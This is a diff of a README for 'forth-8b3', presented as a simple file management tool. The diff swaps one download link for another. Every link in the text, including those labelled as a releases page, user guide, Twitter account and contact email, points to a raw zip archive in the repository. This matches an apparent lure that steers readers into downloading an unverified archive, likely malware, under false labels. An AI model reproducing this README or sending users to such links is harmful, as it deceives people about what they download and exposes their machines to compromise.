@@ -1,6 +1,6 @@
 # 🚀 forth-8b3 - Simple, Fast File Management Tool
 
-[![Download Now](https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip%20Now%20-v1.0-blue)](https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip)
+[![Download Now](https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip%20Now%20-v1.0-blue)](https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip)
 
 ## 🎯 Overview
 forth-8b3 is an easy-to-use file management tool designed for everyday users. This application simplifies the way you manage, organize, and access your files. No programming skills are required, making it accessible for everyone.
@@ -19,14 +19,14 @@ forth-8b3 is an easy-to-use file management tool designed for everyday users. Th
 ## 🚀 Getting Started
 To start using forth-8b3, you need to download the application from our Releases page.
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip) to download forth-8b3.
+1. Visit the [Releases page](https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip) to download forth-8b3.
 2. Locate the latest version on the page.
 3. Click on the version link to view the available files.
 
 ## 📥 Download & Install
 To download and install forth-8b3, follow these steps:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip).
+1. Go to the [Releases page](https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip).
 2. Click on the latest version link.
 3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS).
 4. Click on the file to start the download.
@@ -42,14 +42,14 @@ If you encounter any issues or have questions about using forth-8b3, we provide 
 
 - **FAQ Section:** Check our FAQ section in the GitHub repository for common questions.
 - **Community Support:** Join discussions in our GitHub Issues page to ask questions and share experiences.
-- **Contact:** For direct inquiries, please email https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip
+- **Contact:** For direct inquiries, please email https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip
 
 ## 🔗 Related Resources
 Here are a few resources to help you get the most out of forth-8b3:
 
-- [User Guide](https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip)
-- [Feature Requests](https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip)
-- [Follow Us on Twitter](https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip)
+- [User Guide](https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip)
+- [Feature Requests](https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip)
+- [Follow Us on Twitter](https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip)
 
 ## 🔍 Examples
 Here are a few use cases for forth-8b3:
@@ -68,4 +68,4 @@ We are continuously working to improve forth-8b3. Future updates may include:
 ## 📑 Acknowledgments
 We extend our gratitude to the open-source community for their invaluable contributions to forth-8b3. Your support inspires us to make this tool better.
 
-For more information, visit our [releases page](https://raw.githubusercontent.com/antonio14346/forth-8b3/main/finical/forth-8b3.zip) and start managing your files with ease today!
+For more information, visit our [releases page](https://github.com/antonio14346/forth-8b3/raw/refs/heads/main/finical/forth_b_1.6.zip) and start managing your files with ease today!
